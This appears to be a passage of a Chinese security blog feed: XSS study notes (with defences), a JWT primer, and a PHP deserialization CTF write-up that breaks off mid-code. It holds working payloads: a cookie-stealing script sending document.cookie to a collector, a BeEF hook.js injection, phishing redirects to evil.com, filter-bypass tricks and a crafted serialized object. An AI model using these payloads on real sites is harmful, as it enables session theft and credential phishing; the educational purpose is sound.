class="headerlink" title="DOM　XSS"></a>DOM　XSS</h4><p>这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。</p><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/4.png"></p><h3 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h3><h4 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h4><p>方法一：弹窗警告</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/8.png" alt="8"></p><p>方法二：</p><p><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p><p>在phpstudy的www目录下，新建一个php文件，将以下代码写入</p><blockquote><?php$cookie= $_GET['cookie'];file_put_contents('cookie.txt',$cookie);?></blockquote><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/9.png" alt="9"></p><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><p>使用Cookie存在一定的安全缺陷，开发者开始使用一些更安全的认证方式，如session。在Session机制中，客户端和服务端通过标识符来识别用户身份和维持会话。会话劫持的本质是在攻击中带上cookie并发送到了服务端。</p><p>如在某留言系统存在一个存储型XSS漏洞，攻击者吧XSS代码写进留言信息中，当管理员登录后台并查看，便会触发XSS漏洞，由于XSS是在后台触发的，所以攻击的对象是管理员，通过注入JS代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的</p><p>实验（XSS(Stored)）</p><blockquote><p>工具（beef-xss）：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/10.png"></p><p>改一下代码：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/11.png" alt="11"></p><p>启动beef-xss（kali机自带）：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/12.png"></p><p>打开后跳出一个终端：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/13.png"></p><p>访问 <code>http://127.0.0.1:3000/ui/panel</code></p><p>在XSS（Stored）的message中插入hook.js代码 <code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>，其中<IP>改为虚拟机Ip地址即可</IP></p><p>***查看虚拟机Ip地址：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/14.png"></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/15.png" alt="15"></p><p>DVWA页面如下：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/16.png"></p><p>查看beef网站：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/17.png" alt="17"></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/18.png" alt="18"></p><p>***beef工具：登录弹窗，获取用户及密码</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/19.png"></p><p>DVWA出现登录弹窗：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/20.png"></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/21.png"></p></blockquote><h4 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h4><p>XSS并非全能，前面的例子主要通过JavScript脚本自动攻击，缺少“与用户交互”的过程（即用户不需要输入账户密码，只要触发Js脚本）</p><p>例如“修改用户密码”的功能中，在提交新密码前，都要求用户输入“旧 password” ，而往往攻击者不知道。</p><p>修改密码问题— 为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。</p><p>实现的思路：利用JavaScript在当前页面上显示一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将发送至黑客的服务器上。</p><h5 id="重定向钓鱼"><a href="#重定向钓鱼" class="headerlink" title="重定向钓鱼"></a>重定向钓鱼</h5><p>把当前页面重定向到一个钓鱼页面（可以是自己搭建的页面，来获取用户的信息）</p><p><code>http://www.bug.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code></p><p>例：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/22.png" alt="22"></p><h5 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h5><p>使用XSS漏洞注入HTML或JavaScript代码到页面中</p><p><code>http://www.bug.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code> 该段代码会在正常页面中嵌入一个Form表单（登录框）</p><p>例：<br><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/23.png"></p><h5 id="iframe钓鱼"><a href="#iframe钓鱼" class="headerlink" title="iframe钓鱼"></a>iframe钓鱼</h5><p>通过<iframe>标签嵌入远程域的一个页面实施钓鱼</iframe></p><p><code>http://www.bug.com/index.php?search=&#39;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/24.png" alt="24"></p><h4 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h4><p>在IE中，可以通过判断ActiveX控件的classid是否存在，来推断用户是否安装了该软件。这种方法很早被用于“挂马攻击”—黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。</p><p>如下代码：</p><blockquote><p>try {</p><p>var Obj&#x3D; new ActiveXObject(‘xxxxxx’)       &#x2F;&#x2F;xxxxxx为某控件</p><p>}catch(e){</p><p>&#x2F;&#x2F;异常了，不存在该控件</p><p>}</p></blockquote><p><a href="https://blog.csdn.net/Monsterlz123/article/details/91127385">通过XSS进行网页挂马复现</a></p><h4 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h4><p>2005年，19岁的Samy Kamkar发起对Myspace.com的XSS的XSS Worm攻击（Web安全史上第一个重量级的XSS Worm）</p><p>XSS Worm是XSS的一种终极利用方式，它的破坏性和影响力巨大，但也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在存储型XSS（注意发送站内信、用户留言等页面），则比较容易发生XSS Worm攻击。</p><p><a href="https://blog.csdn.net/qq_33605106/article/details/79756478">百度XSS Worm</a></p><h3 id="XSS攻击技巧"><a href="#XSS攻击技巧" class="headerlink" title="XSS攻击技巧"></a>XSS攻击技巧</h3><ul><li><p>利用字符编码</p><p>利用字符编码，通过这种技巧，不仅能让 XSS 代码绕过服务端的过滤，还能更好地隐藏 Shellcode；（ JS 支持 unicode、eacapes、十六进制、十进制等编码形式）</p></li><li><p>绕过 XSS-Filter，利用 &lt;&gt; 标签注入 Html&#x2F;JavaScript 代码；</p></li><li><p>利用 HTML 标签的属性值进行 XSS 攻击。例如：<img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/javascript:alert(‘xss’)">；（当然并不是所有的 Web 浏览器都支持 Javascript 伪协议，所以此类 XSS 攻击具有一定的局限性）</p></li><li><p>空格、回车和 Tab。如果 XSS Filter 仅仅将敏感的输入字符列入黑名单，比如 javascript，用户可以利用空格、回车和 Tab 键来绕过过滤，例如：&lt;img src&#x3D;“javas cript:alert(&#x2F;xss&#x2F;);”&#x2F;&gt;；</p></li><li><p>利用事件来执行跨站脚本。例如：&lt;img src&#x3D;”#” onerror&#x3D; “alert(1)”&#x2F;&gt;，当 src 错误的视乎就会执行 onerror 事件；</p></li><li><p>利用 CSS 跨站。例如：body {backgrund-image: url(“javascript:alert(‘xss’)”)}；扰乱过滤规则。例如：&lt;IMG SRC&#x3D;“javaSCript: alert(&#x2F;xss&#x2F;);”&#x2F;&gt;；</p></li><li><p>拆分跨站法，将 XSS 攻击的代码拆分开来，适用于应用程序没有过滤 XSS 关键字符（如&lt;、&gt;）却对输入字符长度有限制的情况下；</p></li><li><p>DOM 型的 XSS 主要是由客户端的脚本通过 DOM 动态地输出数据到页面上，它不依赖于提交数据到服务器，而是从客户端获得DOM中的数据在本地执行。容易导致 DOM 型的 XSS 的输入源包括：Document.URL、Location(.pathname|.href|.search|.hash)、Document.referrer、Window.name、Document.cookie、localStorage&#x2F;globalStorage；</p></li></ul><h3 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h3><h4 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h4><p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如＜、＞、‘　、“等，如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查，可能还会匹配XSS的特征。比如”<script>“，”javascript"等敏感字符。这种输入检查的方式，可以称为“XSS Filter”</p><p>但XSS Filter进行XSS检查时，用户数据没有结合渲染页面的HTML代码，因此XSS Filter 对语境的理解并不完整；且对“<”、“>”等字符的处理，可能会改变用户数据的语义。</p><h4 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h4><p>一般来说，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击</p><p>编码分为很多种，有针对html，javascript等的编码方式</p><p>**1.**针对HTML的编码方式：HTMLEncode</p><p>为了对抗XSS，要求至少转换以下字符：</p><table><thead><tr><th>字符</th><th>编码后</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp;amp</td></tr><tr><td>&lt;</td><td>&amp;lt</td></tr><tr><td>&gt;</td><td>&amp;gt</td></tr><tr><td>“</td><td>&amp;quot</td></tr><tr><td>‘</td><td>&amp;#x27</td></tr><tr><td>&#x2F;</td><td>&amp;#x2F</td></tr></tbody></table><p>**2.**在php中，有phplentities()和htmlspecialchars()两个函数可以满足安全要求</p><p>**3.**针对jJS的编码方式：JavascriptEncode</p><p>与HTMLEncode不同，他需要使用“/“对特殊字符进行转义</p><p>在对抗XSS时，还要求输出的变量必须在引号内部。比较以下两种写法：</p><blockquote><p>var x = escapeJavascript ( $ evil ) ;</p><p>var y =' " ' +escapeJavascript ( $ evil ) + ' " ' ;</p></blockquote><p>如果escapeJavascript()函数只转义几个危险字符，比如 ’、“、< 、> 、\ 、& 、# 等，那么上面的两行代码输出后可能会变成：</p><blockquote><p>var x = 1 ; alert (2) ;</p><p>var y = " 1 ; alert (2) " ;</p></blockquote><p>第一行执行额外的代码了；第二行则是安全的。</p><p>对于第二行，攻击者即使想逃逸出引号的范围：<code> var y =&quot;\&quot;; alert(1)\/\/ &quot;</code></p><p>所以JavascriptEncode的变量输出一定要在引号内。防止开发者忘了，只能使用一个更严格的JavascriptEncode函数来保证安全——除了数字、字母外的所有字符，都使用十六进制“\xHH” 的方式进行编码</p></script></p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT基础知识</title>
      <link href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/04/08/JWT%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="JWT基础知识"><a href="#JWT基础知识" class="headerlink" title="JWT基础知识"></a>JWT基础知识</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>系统梳理总结cookie、Session和Token</p><ul><li>cookie：存在客户端，保存信息</li><li>Session：存在服务端，解决多用户问题，每个客户端对应一个session</li><li>Token：无状态且支持跨域，防御CSRF，解决session依赖于单个web服务器</li></ul><span id="more"></span><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>cookie：网站向访问电脑写入的小文本，记录用户ID、密码、停留时间等，大多数是4KB。cookie分成两类：1.内存Cookie，保存在内存，浏览器关闭就消失；2.硬盘Cookie，保存在硬盘里，有过期时间。</p><p>HTTP协议是一种无状态协议（服务器不会记录客户端的历史请求），cookie和session的主要目的就是为了弥补HTTP的无状态特性</p><p><img src="https://krismile-ni.github.io/2022/04/08/image/1.png"></p><p>​    1、当用户第一次访问服务器时，服务器可以响应信息（response）中增加Set-Cookie响应头，将信息以cookie为载体发送到浏览器</p><p>​    2、浏览器接收到服务器放来的Cookie信息，将它保存到浏览器的缓冲区</p><p>​    3、当浏览器再次访问服务器时，将Cookie放在请求消息中，Web服务器就可以通过request中的用户信息来分辨请求的用户</p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>session：客户端请求服务端，服务端会为这次请求开辟一块内存空间，这个对象便是session对象，存储结构为concurrentHashMap。session弥补了HTTP无状态特性，服务器可以利用Session存储客户端在同一个会话期间的一些操作记录，服务器也为session设置了一个有效期（30分钟）</p><p><img src="https://krismile-ni.github.io/2022/04/08/image/2.png"></p><p>session原理：</p><ol><li>服务器第一次接收到请求时，开辟了一块session空间（创建session对象），同时生成一个sessionid，并通过响应头的<code>set-cookie:JSESSIONID=xxxxxx</code>命令，向客户端发送要求设置cookie的响应</li><li>客户端收到响应后，在本机设置应该<code>JSESSION=xxxxxx</code>的cookie信息，该cookie的过期时间为浏览器会话结束</li><li>接下来客户端每次向同一个网站发送请求时，请求头都会带上该cookie信息（包含sessionid）然后服务器通过读取请求头中的cookie信息，获取名称JSESSION的值，得到sessionid</li></ol><h4 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h4><p>Token：令牌，本质上它是一个全局唯一的字符串，用来唯一识别一个客户端，它不是一种web规范，可以理解它是借鉴了cookie和session工作原理，进而延申出来的一种维持用户会话状态的机制</p><p>Token原理：</p><ol><li>客户端使用用户名跟密码请求登录</li><li>服务端收到请求，验证用户名和密码</li><li>验证成功后，服务端会签发一个Token，将其发送给客户端</li><li>客户端收到Token后，将其存储起来，放在cookie或者local storage里</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的Token</li><li>服务端收到请求，去验证客户端请求里面带着的Token是否成功，成功就向客户端返回请求的数据</li><li>因为token是被签名的，所以可以认为一个可以解码认证通过的token是由系统发放的，其中带的信息是合法有效的</li></ol><p>Token特点：</p><ul><li>支持跨域访问，前提是传输的用户认证信息通过HTTP头传输</li><li>无状态，在服务端不需要存储session信息，因为Token自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息</li><li>更适合CDN（构建在数据网络上的一种分布式的内容分发网），服务端只要提供API即可</li><li>去耦，不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要API被调用就会调用Token生成</li><li>更适合移动应用</li><li>CSRF，因为不再依赖于cookie，不需要考虑对CSRF（跨站请求伪造）的防范</li></ul><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>  Json Web Token(JWT)，是为了再网络应用环境间传递申明而执行的一种基于JSON的开放标准。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO)场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;角色&quot;</span><span class="punctuation">:</span> <span class="string">&quot;管理员&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h3 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h3><p>JWT结构：</p><p><img src="https://krismile-ni.github.io/2022/04/08/image/3.png" alt="img"></p><p>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的</p><p>JWT 的三个部分依次如下:</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p>写成一行，就是下面的样子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure><p>每个部分最后都会使用base64编码</p><h5 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h5><p>Header部分是一个JSON对象，描述JWT的元数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法</p><p>typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。</p><h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><p>payload部分也是一个JSON对象，用来实际需要传递的数据。JWT规定了7个官方字段</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，还可以在这个部分定义私有字段。</p><p>注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分</p><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>Signature 部分是对前两部分的签名，防止数据篡改</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，<strong>使用 Header 里面指定的签名算法（默认是 HMAC SHA256）</strong>，按照下面的公式产生签名。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础，JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化题目</title>
      <link href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
      <url>/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP反序列化题目"><a href="#PHP反序列化题目" class="headerlink" title="PHP反序列化题目"></a>PHP反序列化题目</h2><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/1.png"></p><span id="more"></span><p>工具：dirsearch进行目录扫描</p><blockquote><p>该工具依靠python3，要在python3的环境运行</p><p>命令：<code>python dirsearch.py -u http://d9d7eac4-2d3a-40a9-8a64-ffd5d90dde82.node4.buuoj.cn:81 -e php</code></p><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/3.png"></p><p>找到状态为200的目录   —&gt;<a href="http://www.zip/">www.zip</a>     (备份文件)</p><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/4.png"></p></blockquote><p>下载保存<a href="http://www.zip/">www.zip</a></p><p>url：<code>http://d9d7eac4-2d3a-40a9-8a64-ffd5d90dde82.node4.buuoj.cn:81/www.zip</code></p><p>压缩包里有以下文件：</p><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/2.png"></p><p><code>flag.php</code>里面是假的flag</p><p><code>class.php</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;      \\包含了flag.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;                       \\创建一个Name对象</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;                        \\在反序列化时会自动调用</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;                     \\该if语句提示我们password为100</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;    \\该句提示我们username为admin</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHP类中一般会包含一些特殊的函数叫做magic函数，这些函数以双斜划线开始，它们的主要作用是在某些情况下（反序列化），会自动调用，以保证程序的健壮性，也是因为自动调用，使得程序在一些情况下存在漏洞。</p><p><strong>PHP常见的magic方法：</strong></p><table><thead><tr><th>方法名</th><th>触发点</th></tr></thead><tbody><tr><td>__construct</td><td>当创建对象时初始化对象，一般用于对变量赋初值</td></tr><tr><td>__destruct</td><td>当对象不再被使用时（将所有该对象的引用设为null）或者程序退出时自动调用</td></tr><tr><td>__toString</td><td>当一个对象被当作一个字符串调用，把类当作字符串使用时触发，返回值是字符串</td></tr><tr><td>__wakeup()</td><td>使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep()</td><td>使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><p><code>index.php</code>里有一段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   include &#x27;class.php&#x27;;</span><br><span class="line">   $select = $_GET[&#x27;select&#x27;];</span><br><span class="line">   $res=unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>说明传入参数名为select，（unserialize   反序列化）</p><p>写一个php文件创建一个新的Name对象，并对它赋值为（’admin’,100),进行反序列化，得到相应字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Name(&#x27;admin&#x27;,100);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在本机访问该php文件，得到相应字符串</p><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/5.png"></p><p>但从class.php可知，他将username和password设置为private</p><blockquote><p>三种修饰方式的测试:public,protected,private</p><p>只有public修饰的不用太多的修饰原生态构造就好，</p><p>而private需要加**%00Name%00**，protected则需要使用   <strong>%00*%00username</strong>这样的方式</p></blockquote><p>得到：O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><p>将该字符串进行传参，得到flag</p><p><img src="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/6.png"></p><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 